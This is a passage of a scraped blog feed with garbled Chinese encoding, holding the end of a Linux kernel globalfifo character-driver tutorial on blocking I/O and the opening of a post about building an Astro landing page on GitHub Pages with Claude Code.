<span style="color: rgba(0, 0, 0, 1)">        __set_current_state(TASK_INTERRUPTIBLE);

        up(</span>&amp;dev-&gt;<span style="color: rgba(0, 0, 0, 1)">sem);

        </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> 5.è°åº¦å¶ä»è¿ç¨æ§è¡ï¼çæ­£ç¡ç ï¼        </span>
<span style="color: rgba(0, 0, 0, 1)">        schedule();

        </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> 6.æ£æ¥å¦ææä¿¡å·å°è¾¾è¿åä¸å±å¤çéè¯¯ï¼èªå·±çå¤éåªå°ç¶æè½¬æ¢ä¸ºTASK_RUNNINGï¼ä½ä¿¡å·å°æ¥ä¹ä¼åè¿ä¸ªå¤çï¼</span>
        <span style="color: rgba(0, 0, 255, 1)">if</span><span style="color: rgba(0, 0, 0, 1)"> (signal_pending(current)) {
            ret </span>= -<span style="color: rgba(0, 0, 0, 1)">ERESTARTSYS;
            remove_wait_queue(</span>&amp;dev-&gt;w_wait, &amp;<span style="color: rgba(0, 0, 0, 1)">wait);
            set_current_state(TASK_RUNNING);
            </span><span style="color: rgba(0, 0, 255, 1)">return</span><span style="color: rgba(0, 0, 0, 1)"> ret;
        }
        
        </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> è¢«å¤éåçå¤ç</span>
        down(&amp;dev-&gt;<span style="color: rgba(0, 0, 0, 1)">sem);
    }

    </span><span style="color: rgba(0, 0, 255, 1)">if</span>(count &gt; dev-&gt;<span style="color: rgba(0, 0, 0, 1)">current_len)
        count </span>= dev-&gt;<span style="color: rgba(0, 0, 0, 1)">current_len;

    </span><span style="color: rgba(0, 0, 255, 1)">if</span>(copy_to_user(buf, dev-&gt;<span style="color: rgba(0, 0, 0, 1)">mem, count)) {
        ret </span>= -<span style="color: rgba(0, 0, 0, 1)">EFAULT;
        up(</span>&amp;dev-&gt;<span style="color: rgba(0, 0, 0, 1)">sem);
        remove_wait_queue(</span>&amp;dev-&gt;w_wait, &amp;<span style="color: rgba(0, 0, 0, 1)">wait);
           set_current_state(TASK_RUNNING);
        </span><span style="color: rgba(0, 0, 255, 1)">return</span><span style="color: rgba(0, 0, 0, 1)"> ret;
    } </span><span style="color: rgba(0, 0, 255, 1)">else</span><span style="color: rgba(0, 0, 0, 1)"> {
        memcpy(dev</span>-&gt;mem, dev-&gt;mem + count, dev-&gt;current_len -<span style="color: rgba(0, 0, 0, 1)"> count);
        dev</span>-&gt;current_len -=<span style="color: rgba(0, 0, 0, 1)"> count;
            
        wake_up_interruptible(</span>&amp;dev-&gt;w_wait);    <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> è¯»åºæ°æ®åå¤éåè¿ç¨</span>
        ret =<span style="color: rgba(0, 0, 0, 1)"> count;
    }
    
    up(</span>&amp;dev-&gt;<span style="color: rgba(0, 0, 0, 1)">sem);
    remove_wait_queue(</span>&amp;dev-&gt;w_wait, &amp;<span style="color: rgba(0, 0, 0, 1)">wait);
    set_current_state(TASK_RUNNING);

    </span><span style="color: rgba(0, 0, 255, 1)">return</span><span style="color: rgba(0, 0, 0, 1)"> ret;
}


</span><span style="color: rgba(0, 128, 0, 1)">/*</span><span style="color: rgba(0, 128, 0, 1)"> user write fd </span><span style="color: rgba(0, 128, 0, 1)">*/</span> 
<span style="color: rgba(0, 0, 255, 1)">static</span> ssize_t globalfifo_write(<span style="color: rgba(0, 0, 255, 1)">struct</span> file* filp, <span style="color: rgba(0, 0, 255, 1)">const</span> <span style="color: rgba(0, 0, 255, 1)">char</span> __user* buf, size_t count, loff_t*<span style="color: rgba(0, 0, 0, 1)"> ppos) {
    </span><span style="color: rgba(0, 0, 255, 1)">int</span><span style="color: rgba(0, 0, 0, 1)"> ret;    
    </span><span style="color: rgba(0, 0, 255, 1)">struct</span> globalfifo_dev* dev = filp-&gt;<span style="color: rgba(0, 0, 0, 1)">private_data;    

    </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> å®ä¹ç­å¾éå</span>
<span style="color: rgba(0, 0, 0, 1)">    DECLARE_WAITQUEUE(wait, current);
    down(</span>&amp;dev-&gt;<span style="color: rgba(0, 0, 0, 1)">sem);
    </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> 1.å°ç­å¾éåæå¥åç­å¾éåå¤´</span>
    add_wait_queue(&amp;dev-&gt;w_wait, &amp;<span style="color: rgba(0, 0, 0, 1)">wait);

    </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> 2.å¾ªç¯ç­å¾ è¥FIFOæ»¡ååºè¯¥æèµ·</span>
    <span style="color: rgba(0, 0, 255, 1)">while</span> (dev-&gt;current_len ==<span style="color: rgba(0, 0, 0, 1)"> GLOBALFIFO_SIZE) {
        </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> 3. è¥éé»å¡åç´æ¥è¿å</span>
        <span style="color: rgba(0, 0, 255, 1)">if</span> (filp-&gt;f_flags &amp;<span style="color: rgba(0, 0, 0, 1)"> O_NONBLOCK) {
            up(</span>&amp;dev-&gt;<span style="color: rgba(0, 0, 0, 1)">sem);
            ret </span>= -<span style="color: rgba(0, 0, 0, 1)">EAGAIN;
            remove_wait_queue(</span>&amp;dev-&gt;w_wait, &amp;<span style="color: rgba(0, 0, 0, 1)">wait);
            set_current_state(TASK_RUNNING);
            </span><span style="color: rgba(0, 0, 255, 1)">return</span><span style="color: rgba(0, 0, 0, 1)"> ret;
        }
        </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> 4.å°è¿ç¨ç¶ææ¹ä¸ºå¯ææ­ç¡ç </span>
<span style="color: rgba(0, 0, 0, 1)">        __set_current_state(TASK_INTERRUPTIBLE);
        up(</span>&amp;dev-&gt;<span style="color: rgba(0, 0, 0, 1)">sem);
        </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> 5.è°åº¦å¶ä»è¿ç¨ï¼çæ­£ç¡ç ï¼</span>
<span style="color: rgba(0, 0, 0, 1)">        schedule();

        </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> 6.è¥å ä¸ºä¿¡å·å¤éï¼åè¿åè®©ä¸å±å®æéè¯¯å¤ç</span>
        <span style="color: rgba(0, 0, 255, 1)">if</span><span style="color: rgba(0, 0, 0, 1)"> (signal_pending(current)) {
            ret </span>= -<span style="color: rgba(0, 0, 0, 1)">ERESTARTSYS;
            remove_wait_queue(</span>&amp;dev-&gt;w_wait, &amp;<span style="color: rgba(0, 0, 0, 1)">wait);
            set_current_state(TASK_RUNNING);
            </span><span style="color: rgba(0, 0, 255, 1)">return</span><span style="color: rgba(0, 0, 0, 1)"> ret;
        }
        down(</span>&amp;dev-&gt;<span style="color: rgba(0, 0, 0, 1)">sem);
    }

    </span><span style="color: rgba(0, 0, 255, 1)">if</span> (count &gt; GLOBALFIFO_SIZE - dev-&gt;<span style="color: rgba(0, 0, 0, 1)">current_len)
        count </span>= GLOBALFIFO_SIZE - dev-&gt;<span style="color: rgba(0, 0, 0, 1)">current_len;

    </span><span style="color: rgba(0, 0, 255, 1)">if</span> (copy_from_user(dev-&gt;<span style="color: rgba(0, 0, 0, 1)">mem, buf, count)) {
        ret </span>= -<span style="color: rgba(0, 0, 0, 1)">EFAULT;
        up(</span>&amp;dev-&gt;<span style="color: rgba(0, 0, 0, 1)">sem);
        remove_wait_queue(</span>&amp;dev-&gt;w_wait, &amp;<span style="color: rgba(0, 0, 0, 1)">wait);
        set_current_state(TASK_RUNNING);
        </span><span style="color: rgba(0, 0, 255, 1)">return</span><span style="color: rgba(0, 0, 0, 1)"> ret;
    } </span><span style="color: rgba(0, 0, 255, 1)">else</span><span style="color: rgba(0, 0, 0, 1)"> {
        dev</span>-&gt;current_len +=<span style="color: rgba(0, 0, 0, 1)"> count;
        </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> å¤éç­å¾éå</span>
        wake_up_interruptible(&amp;dev-&gt;<span style="color: rgba(0, 0, 0, 1)">r_wait);
        ret </span>=<span style="color: rgba(0, 0, 0, 1)"> count;    
    }

    up(</span>&amp;dev-&gt;<span style="color: rgba(0, 0, 0, 1)">sem);
    remove_wait_queue(</span>&amp;dev-&gt;w_wait, &amp;<span style="color: rgba(0, 0, 0, 1)">wait);
    set_current_state(TASK_RUNNING);

    </span><span style="color: rgba(0, 0, 255, 1)">return</span><span style="color: rgba(0, 0, 0, 1)"> count;
}


</span><span style="color: rgba(0, 128, 0, 1)">/*</span><span style="color: rgba(0, 128, 0, 1)"> user lseek fd </span><span style="color: rgba(0, 128, 0, 1)">*/</span>
<span style="color: rgba(0, 0, 255, 1)">static</span> loff_t globalfifo_llseek(<span style="color: rgba(0, 0, 255, 1)">struct</span> file* filp, loff_t offset, <span style="color: rgba(0, 0, 255, 1)">int</span><span style="color: rgba(0, 0, 0, 1)"> orig) {
    loff_t ret;
    </span><span style="color: rgba(0, 0, 255, 1)">switch</span><span style="color: rgba(0, 0, 0, 1)">(orig) {
    </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> ä»èµ·å§ä½ç½®å¼å§ç§»å¨æé</span>
    <span style="color: rgba(0, 0, 255, 1)">case</span> <span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">:
        </span><span style="color: rgba(0, 0, 255, 1)">if</span>(offset &lt; <span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">) {
            ret </span>= -<span style="color: rgba(0, 0, 0, 1)">EINVAL;
            </span><span style="color: rgba(0, 0, 255, 1)">break</span><span style="color: rgba(0, 0, 0, 1)">;
        }
        </span><span style="color: rgba(0, 0, 255, 1)">if</span>((unsigned <span style="color: rgba(0, 0, 255, 1)">int</span>)offset &gt;<span style="color: rgba(0, 0, 0, 1)"> GLOBALFIFO_SIZE) {
            ret </span>= -<span style="color: rgba(0, 0, 0, 1)">EINVAL;
            </span><span style="color: rgba(0, 0, 255, 1)">break</span><span style="color: rgba(0, 0, 0, 1)">;
        }
        filp</span>-&gt;f_pos = (unsigned <span style="color: rgba(0, 0, 255, 1)">int</span><span style="color: rgba(0, 0, 0, 1)">)offset;
        ret </span>= filp-&gt;<span style="color: rgba(0, 0, 0, 1)">f_pos;
        </span><span style="color: rgba(0, 0, 255, 1)">break</span><span style="color: rgba(0, 0, 0, 1)">;
    </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> ä»å½åä½ç½®å¼å§ç§»å¨æé</span>
    <span style="color: rgba(0, 0, 255, 1)">case</span> <span style="color: rgba(128, 0, 128, 1)">1</span><span style="color: rgba(0, 0, 0, 1)">:
        </span><span style="color: rgba(0, 0, 255, 1)">if</span>((filp-&gt;f_pos + offset) &gt;<span style="color: rgba(0, 0, 0, 1)"> GLOBALFIFO_SIZE) {
            ret </span>= -<span style="color: rgba(0, 0, 0, 1)">EINVAL;
            </span><span style="color: rgba(0, 0, 255, 1)">break</span><span style="color: rgba(0, 0, 0, 1)">;
        }
        </span><span style="color: rgba(0, 0, 255, 1)">if</span>((filp-&gt;f_pos + offset) &lt; <span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">) {
            ret </span>= -<span style="color: rgba(0, 0, 0, 1)">EINVAL;
            </span><span style="color: rgba(0, 0, 255, 1)">break</span><span style="color: rgba(0, 0, 0, 1)">;
        }
        filp</span>-&gt;f_pos +=<span style="color: rgba(0, 0, 0, 1)"> offset;
        ret </span>= filp-&gt;<span style="color: rgba(0, 0, 0, 1)">f_pos;
        </span><span style="color: rgba(0, 0, 255, 1)">break</span><span style="color: rgba(0, 0, 0, 1)">;
    </span><span style="color: rgba(0, 0, 255, 1)">default</span><span style="color: rgba(0, 0, 0, 1)">:
        ret </span>= -<span style="color: rgba(0, 0, 0, 1)">EINVAL;
    }
    </span><span style="color: rgba(0, 0, 255, 1)">return</span><span style="color: rgba(0, 0, 0, 1)"> ret;
}


</span><span style="color: rgba(0, 128, 0, 1)">/*</span><span style="color: rgba(0, 128, 0, 1)"> user ioctl fd </span><span style="color: rgba(0, 128, 0, 1)">*/</span>
<span style="color: rgba(0, 0, 255, 1)">static</span> <span style="color: rgba(0, 0, 255, 1)">long</span> globalfifo_unlocked_ioctl(<span style="color: rgba(0, 0, 255, 1)">struct</span> file *filp, unsigned <span style="color: rgba(0, 0, 255, 1)">int</span> cmd, unsigned <span style="color: rgba(0, 0, 255, 1)">long</span><span style="color: rgba(0, 0, 0, 1)"> arg){
    </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> è·åè®¾å¤ç»æä½æé    </span>
    <span style="color: rgba(0, 0, 255, 1)">struct</span> globalfifo_dev* dev = filp-&gt;<span style="color: rgba(0, 0, 0, 1)">private_data;    
    
    </span><span style="color: rgba(0, 0, 255, 1)">switch</span><span style="color: rgba(0, 0, 0, 1)">(cmd) {
    </span><span style="color: rgba(0, 0, 255, 1)">case</span><span style="color: rgba(0, 0, 0, 1)"> MEM_CLEAR:
        down(</span>&amp;dev-&gt;<span style="color: rgba(0, 0, 0, 1)">sem);
        dev</span>-&gt;current_len = <span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">;
        memset(dev</span>-&gt;mem, <span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">, GLOBALFIFO_SIZE);
        up(</span>&amp;dev-&gt;<span style="color: rgba(0, 0, 0, 1)">sem);
        </span><span style="color: rgba(0, 0, 255, 1)">break</span><span style="color: rgba(0, 0, 0, 1)">;
    </span><span style="color: rgba(0, 0, 255, 1)">default</span><span style="color: rgba(0, 0, 0, 1)">:
        </span><span style="color: rgba(0, 0, 255, 1)">return</span> -<span style="color: rgba(0, 0, 0, 1)">EINVAL;
    }
    </span><span style="color: rgba(0, 0, 255, 1)">return</span> <span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">;
}



</span><span style="color: rgba(0, 0, 255, 1)">static</span> <span style="color: rgba(0, 0, 255, 1)">const</span> <span style="color: rgba(0, 0, 255, 1)">struct</span> file_operations globalfifo_fops =<span style="color: rgba(0, 0, 0, 1)"> {
    .owner </span>=<span style="color: rgba(0, 0, 0, 1)"> THIS_MODULE,
    .open </span>=<span style="color: rgba(0, 0, 0, 1)"> globalfifo_open,
    .release </span>=<span style="color: rgba(0, 0, 0, 1)"> globalfifo_release,
    .llseek </span>=<span style="color: rgba(0, 0, 0, 1)"> globalfifo_llseek,
    .read </span>=<span style="color: rgba(0, 0, 0, 1)"> globalfifo_read,
    .write </span>=<span style="color: rgba(0, 0, 0, 1)"> globalfifo_write,
    .unlocked_ioctl </span>=<span style="color: rgba(0, 0, 0, 1)"> globalfifo_unlocked_ioctl
};


</span><span style="color: rgba(0, 128, 0, 1)">/*</span><span style="color: rgba(0, 128, 0, 1)"> è®¾å¤é©±å¨æ¨¡åinsmodå è½½å½æ° </span><span style="color: rgba(0, 128, 0, 1)">*/</span>
<span style="color: rgba(0, 0, 255, 1)">static</span> <span style="color: rgba(0, 0, 255, 1)">int</span> globalfifo_init(<span style="color: rgba(0, 0, 255, 1)">void</span><span style="color: rgba(0, 0, 0, 1)">) {
    </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> å Linux åæ ¸ä¸­æ³¨åå­ç¬¦è®¾å¤ç¼å·èå´</span>
    register_chrdev_region(MKDEV(globalfifo_major, <span style="color: rgba(128, 0, 128, 1)">0</span>), <span style="color: rgba(128, 0, 128, 1)">1</span>, <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">globalfifo</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">);

    </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> ä¸ºè®¾å¤ä»¥åå±äº«åå­åéåå­</span>
    globalfifo_devp = kmalloc(<span style="color: rgba(0, 0, 255, 1)">sizeof</span>(<span style="color: rgba(0, 0, 255, 1)">struct</span><span style="color: rgba(0, 0, 0, 1)"> globalfifo_dev), GFP_KERNEL);
    memset(globalfifo_devp, </span><span style="color: rgba(128, 0, 128, 1)">0</span>, <span style="color: rgba(0, 0, 255, 1)">sizeof</span>(<span style="color: rgba(0, 0, 255, 1)">struct</span><span style="color: rgba(0, 0, 0, 1)"> globalfifo_dev));
    
    </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> åå§åå­ç¬¦è®¾å¤0çåºæ¬å­æ®µ</span>
    cdev_init(&amp;globalfifo_devp-&gt;m_cdev, &amp;<span style="color: rgba(0, 0, 0, 1)">globalfifo_fops);
    globalfifo_devp</span>-&gt;m_cdev.owner =<span style="color: rgba(0, 0, 0, 1)"> THIS_MODULE;
    </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> å°ä¸»è®¾å¤å·globalfifo_majoræ¬¡è®¾å¤å·0ï¼ä¸å­ç¬¦è®¾å¤é©±å¨çå³è</span>
    cdev_add(&amp;globalfifo_devp-&gt;m_cdev, MKDEV(globalfifo_major, <span style="color: rgba(128, 0, 128, 1)">0</span>), <span style="color: rgba(128, 0, 128, 1)">1</span><span style="color: rgba(0, 0, 0, 1)">);

    </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> åå§åä¿¡å·é</span>
    sema_init(&amp;globalfifo_devp-&gt;sem, <span style="color: rgba(128, 0, 128, 1)">1</span><span style="color: rgba(0, 0, 0, 1)">);

    </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> åå§åè¯»åç­å¾éåå¤´</span>
    init_waitqueue_head(&amp;globalfifo_devp-&gt;<span style="color: rgba(0, 0, 0, 1)">r_wait);
    init_waitqueue_head(</span>&amp;globalfifo_devp-&gt;<span style="color: rgba(0, 0, 0, 1)">w_wait);
    </span><span style="color: rgba(0, 0, 255, 1)">return</span> <span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">;
}


</span><span style="color: rgba(0, 0, 255, 1)">static</span> <span style="color: rgba(0, 0, 255, 1)">void</span> globalfifo_exit(<span style="color: rgba(0, 0, 255, 1)">void</span><span style="color: rgba(0, 0, 0, 1)">) {
    dev_t devno;
    </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> æ³¨écdev</span>
    cdev_del(&amp;globalfifo_devp-&gt;<span style="color: rgba(0, 0, 0, 1)">m_cdev);
    </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> éæ¾è®¾å¤ç»æä½åå­</span>
<span style="color: rgba(0, 0, 0, 1)">    kfree(globalfifo_devp);    
    </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> éæ¾è®¾å¤å·</span>
    devno = MKDEV(globalfifo_major, <span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">);
    unregister_chrdev_region(devno, </span><span style="color: rgba(128, 0, 128, 1)">1</span><span style="color: rgba(0, 0, 0, 1)">);
}


MODULE_AUTHOR(</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">cear</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">);
MODULE_LICENSE(</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">GPL</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">);

module_param(globalfifo_major, </span><span style="color: rgba(0, 0, 255, 1)">int</span><span style="color: rgba(0, 0, 0, 1)">, S_IRUGO);
module_init(globalfifo_init);
module_exit(globalfifo_exit);</span></pre>
</div>
<p>&nbsp;</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-16 09:52">2026-02-16 09:51</span>&nbsp;
<a href="https://www.cnblogs.com/cear">cear</a>&nbsp;
éè¯»(<span id="post_view_count">3</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19617828);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19617828', targetLink: 'https://www.cnblogs.com/cear/p/19617828', title: 'linuxè®¾å¤é©±å¨é»å¡IOåºç¨' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ Claude CodeéåAstro + GitHub Pagesï¼ä¸º sharelatex-ce æé ç°ä»£åçå¼æºé¡¹ç®å®£ä¼ é¡µ ]]></title>
    <link>https://www.cnblogs.com/xuhe2/p/19618589</link>
    <guid>7ac2a98e1eff04be3c5c5c0d419965b1</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/xuhe2/p/19618589" title="åå¸äº 2026-02-15 21:51">
    <span role="heading" aria-level="2">Claude CodeéåAstro + GitHub Pagesï¼ä¸º sharelatex-ce æé ç°ä»£åçå¼æºé¡¹ç®å®£ä¼ é¡µ</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="ææ">ææ</h1>
<p>å¼æºé¡¹ç®å®£ä¼ é¡µ: <a href="https://xuhe2.github.io/sharelatex-ce/" target="_blank" rel="noopener nofollow">https://xuhe2.github.io/sharelatex-ce/</a></p>
<blockquote>
<p>å ä¸ºèªå»ºåä½ç¯å¢ä¸è¯¥æ¯åè®ºææ¬èº«è¿é¾ï¼æä»¥æåäº sharelatex-ce æ¥å®ç°çæ­£çâä¸é®å¼â Overleaf ç§æåé¨ç½²ä½éªã</p>
</blockquote>
<p>å®ç°ææ:<br>
<img alt="PixPin_2026-02-15_21-33-47" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3573053/202602/3573053-20260215213401024-1486054999.gif" class="lazyload"></p>
<h1 id="ä¸ºä»ä¹éè¦ä¸ä¸ªå¥½ççå®£ä¼ é¡µ">ä¸ºä»ä¹éè¦ä¸ä¸ªå¥½ççå®£ä¼ é¡µï¼</h1>
<p>è¯´å®è¯ï¼ç¨åºåç¼éçâç¾âå¾å¾å¾çº¯ç²¹ï¼ä»£ç æ´æ´ãæ¶æä¼éãREADME ææ¡£æ¸æ°ãä½ç°å®æ¯æ®é·çââå¦æä½ çå¼æºé¡¹ç®åªæä¸å å·å°å°çä»£ç åé¿ç¯ç´¯çç Markdown è¯´æï¼é£å®å°±åæ¯ä¸ä¸ªç©¿çç¡è¡£å»åå æå®´çå¤©æï¼å³ä¾¿æ»¡è¹ç»çº¶ï¼ä¹å¾é¾å¨ç¬¬ä¸æ¶é´æä½å«äººçç¼çã</p>
<p>å¨è¿ä¸ªâé¢å¼å³æ­£ä¹âç GitHub æ¶ä»£ï¼å®£ä¼ é¡µï¼Landing Pageï¼å°±æ¯é¡¹ç®çè¸é¢ã å®ä¸ä»è½è®©ç¨æ·å¨ 3 ç§éåæç½ä½ çé¡¹ç®æ¯å¹²ä»ä¹çï¼æ´åæ¯ä¸ç§âä¸ä¸èä¹¦âãä¸ä¸ªç²¾è´çé¡µé¢å¨æ å£°å°åè¯è®¿é®èï¼âçï¼å¼åèè¿è¿ç§ç»ææ«èé½æç£¨å¾è¿ä¹è®¤çï¼ä»£ç è´¨éè¯å®å·®ä¸äºãâ <strong>æ¯ç«ï¼å¤§å®¶é½å¾å¿ï¼æ¯èµ·åææ¡£ï¼è°ä¸å¸æè½ä¸ç¼çå°é£ä¸ªéªéªååç Docker-compose up æé®å¢ï¼</strong></p>
<h1 id="ææ¯éå-åç«¯äººai-å¹²-åç«¯">ææ¯éå: åç«¯äºº+AI å¹² åç«¯</h1>
<p>ä½ä¸ºä¸ååç«¯ç¨åºåï¼è®©ææå CSS å¸å±ç®ç´æ¯æç§ç¨åº¦ä¸çâé·åâãä½å¨ 2026 å¹´ï¼å¦æä½ è¿è§å¾åç½é¡µå¾ä» </p><div> å¼å§ä¸è¡è¡æ ä»£ç ï¼é£å¯è½ççéè¿äºè¿ä¸ªæ¶ä»£ççº¢å©ã<p></p>
<p>æçéåé»è¾éå¸¸ç´æ¥ï¼<strong>AIæé¿ä»ä¹æ¡æ¶, æéä»ä¹æ¡æ¶, è®©ä¸ä¸çäººå¹²ä¸ä¸çäºï¼è®© AI å¹²ç´¯äººçäº</strong></p>
<ul>
<li>
<p>Astro æ¡æ¶ï¼ ä¸ºä»ä¹ä¸é React æ Vueï¼å ä¸ºæä¸éè¦ä¸ä¸ªæ²éçåé¡µåºç¨ãAstro æ¯ä¸ºåå®¹é©±å¨åç½ç«èççï¼å®æå¿«ãæç®ï¼çæçéæé¡µé¢å¹²åå¾åååæ´è¿çä»£ç ãæéè¦çæ¯ï¼å®å¯¹ SEO æå¶åå¥½ï¼ä¸æ¯æåç§ç»ä»¶æ··åï¼âå­¦æ¯èå¿âåè¶³ã</p>
</li>
<li>
<p>Claude Codeï¼ è¿ææ¯æ¬æ¬¡é¨ç½²çç§å¯æ­¦å¨ãä½ä¸ºä¸ä¸ªéåç«¯ç¨åºåï¼æåªéè¦ææçéæ±ãé¡¹ç®å®ä½ãçè³æ¯åæ¬¢çéè²æ¹æ¡(<strong>å¶å®æåæ ¹æ²¡æå®¡ç¾, AIççæ¥å°±å¥½äº, AIå³? æä¼åç</strong>)ä¸¢ç» Claudeãå®ä¸ä»å¸®æååºäºåæ¨¡åæ ·ç UIï¼çè³è¿é£äºå¼¯å¼¯ç»ç»ç GitHub Actions é¨ç½²é»è¾é½å®æå¾ææç½ç½ã</p>
</li>
<li>
<p>AI æ¶ä»£çå¼åèå¼, ç°å¨çå¼åé»è¾å·²ç»åäºå? æåæ ¹ä¸äºè§£ Tailwind ç±»åï¼æåªéè¦æ®æ¼å¥½âäº§åç»çâçè§è²ï¼éè¿ç®ç­çæç¤ºè¯ï¼Promptï¼ææ¥ AI è¿è¡æå»º(<strong>å®ç°ç»è? ç¸ä¿¡AIçå®¡ç¾, åæ­£è¯å®æ¯æå¥½</strong>)ãâä¸æ¯åç«¯åä¸èµ·ï¼èæ¯ Claude æ´ææ§ä»·æ¯ãâ</p>
</li>
</ul>
<h1 id="å¼å¯github-pagesåè½">å¼å¯Github Pagesåè½</h1>
<ol>
<li>
<p>è¿å¥è®¾ç½®ï¼å¨é¡¹ç®ä»åºé¡¶æ ç¹å» Settingsã</p>
</li>
<li>
<p>å®ä½åè½ï¼å·¦ä¾§ä¾§è¾¹æ æ¾å°å¹¶ç¹å» Pages éé¡¹ã</p>
</li>
<li>
<p>éç½®æ¥æºï¼å¨ Build and deployment -&gt; Source ä¸­éæ© Deploy from a branchã</p>
</li>
<li>
<p>éå®è·¯å¾ï¼å¨ Branch ä¸æèåéæ©ç®æ åæ¯ï¼å¦ gh-pagesï¼ï¼è·¯å¾ä¿æ / (root)ã</p>
</li>
<li>
<p>çæè®¿é®ï¼ç¹å» Saveãç¨ç­çå»ï¼é¡µé¢é¡¶é¨ä¼åºç°ç»¿è²çè®¿é® URLã</p>
</li>
</ol>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3573053/202602/3573053-20260215194652773-616333653.png" class="lazyload"></p>
<blockquote>
<p>ç¹å»<code>Settings</code></p>
</blockquote>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3573053/202602/3573053-20260215194814804-528106535.png" class="lazyload"></p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3573053/202602/3573053-20260215194847483-503733933.png" class="lazyload"></p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3573053/202602/3573053-20260215194922624-733251455.png" class="lazyload"></p>
<h1 id="é¨ç½²çå®£ä¼ é¡µåºç°äºèµæºæ æ³å è½½çé®é¢">é¨ç½²çå®£ä¼ é¡µåºç°äºèµæºæ æ³å è½½çé®é¢</h1>
<h2 id="åå ">åå </h2>
<p>GitHub Pages é»è®¤ä½¿ç¨ Jekyll æ¥æå»ºç½é¡µãå¨ Jekyll çè§åä¸­ï¼ä»»ä½ä»¥ä¸åçº¿ _ å¼å¤´çæä»¶å¤¹ï¼ä¾å¦ _astro/ï¼é½ä¼è¢«è§ä¸ºåé¨ç§ææä»¶å¤¹ï¼ä¸ä¼è¢«åå¸å°æå¡å¨ä¸ã</p>
<p>ç±äº Astro é»è®¤å°ææç CSS å JS æä»¶æ¾å¨ _astro/ ç®å½ä¸ï¼GitHub Pages å®éä¸å¹¶æ²¡ææè¿äºæä»¶é¨ç½²åºå»ï¼æä»¥ä½ çæµè§å¨è¯·æ±æ¶ä¼æ¥ 404ã</p>
<h2 id="è§£å³æ¹æ¡1">è§£å³æ¹æ¡1</h2>
<ul>
<li>æ ¸å¿è§£å³æ¹æ³ï¼æ·»å  .nojekyll æä»¶</li>
</ul>
<blockquote>
